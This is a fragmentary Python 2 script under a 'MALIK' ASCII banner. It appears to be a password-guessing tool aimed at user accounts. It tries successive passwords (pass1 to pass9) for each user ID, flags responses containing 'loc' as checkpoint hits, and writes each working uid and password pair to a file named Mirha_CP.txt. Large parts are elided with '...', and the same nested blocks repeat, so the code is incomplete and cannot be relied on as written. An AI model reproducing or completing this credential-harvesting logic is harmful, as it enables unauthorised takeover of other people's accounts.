...
logo = """
888b     d888        d8888 888      8888888 888    d8P  
8888b   d8888       d88888 888        888   888   d8P   
88888b.d88888      d88P888 888        888   888  d8P    
888Y88888P888     d88P 888 888        888   888d88K     
888 Y888P 888    d88P  888 888        888   8888888b    
888  Y8P  888   d88P   888 888        888   888  Y88b   
888   "   888  d8888888888 888        888   888   Y88b  
888       888 d88P     888 88888888 8888888 888    Y88b 
            ...
            if 'loc' in q:
                ...
                if 'loc' in q:
                    ...
                    if 'loc' in q:
                        ...
                        print '\x1b[1;31;1m[Mirha-CP] ' + uid + ' | ' + pass3
                        cp = open('Mirha_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'loc' in q:
                            ...
                            print '\x1b[1;31;1m[Mirha-CP] ' + uid + ' | ' + pass4
                            cp = open('Mirha_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'loc' in q:
                                ...
                                print '\x1b[1;31;1m[Mirha-CP] ' + uid + ' | ' + pass5
                                cp = open('Mirha_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                ...
                                if 'loc' in q:
                                    ...
                                    print '\x1b[1;31;1m[Mirha-CP] ' + uid + ' | ' + pass6
                                    cp = open('Mirha_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    if 'loc' in q:
                                        ...
                                        print '\x1b[1;31;1m[Mirha-CP] ' + uid + ' | ' + pass7
                                        cp = open('Mirha_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        if 'loc' in q:
                                            ...
                                            print '\x1b[1;31;1m[Mirha-CP] ' + uid + ' | ' + pass8
                                            cp = open('Mirha_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            ...
                                            if 'loc' in q:
                                                ...
                                                print '\x1b[1;31;1m[Mirha-CP] ' + uid + ' | ' + pass9
                                                cp = open('Mirha_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'loc' in q:
                ...
                print '\x1b[1;31;1m[Mirha-CP] ' + uid + ' | ' + pass1
                cp = open('Mirha_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                ...
                if 'loc' in q:
                    ...
                    print '\x1b[1;31;1m[Mirha-CP] ' + uid + ' | ' + pass2
                    cp = open('Mirha_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
